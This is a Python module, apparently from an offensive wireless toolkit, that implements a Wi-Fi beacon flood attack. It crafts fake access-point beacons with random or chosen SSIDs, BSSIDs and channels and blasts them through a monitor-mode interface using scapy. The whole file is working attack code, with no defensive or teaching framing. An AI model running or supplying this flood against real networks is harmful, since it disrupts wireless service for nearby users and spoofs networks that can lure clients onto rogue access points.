"""
Beacon Flood Attack: spam fake AP beacons.
"""
from scapy.all import sendp
from daemon.modules.utils.packet_crafter import PacketCrafter
import random


class BeaconFlood:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def run(self, args):
        iface = self.config.mon_iface
        count = args.count
        ssid = args.ssid or "DEMON_NET"
        bssid = args.bssid or "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        channel = args.channel or random.randint(1,11)

        self.logger.attack_log(f"Beacon flood -> {ssid} | {bssid} | CH:{channel} x{count}")
        pkt = PacketCrafter.beacon(ssid, bssid, channel)
        try:
            sendp(pkt, iface=iface, count=count, inter=0.001, verbose=0)
            self.logger.success("Beacon flood complete.")
            return True
        except Exception as e:
            self.logger.error(f"Beacon flood failed: {e}")
            return False
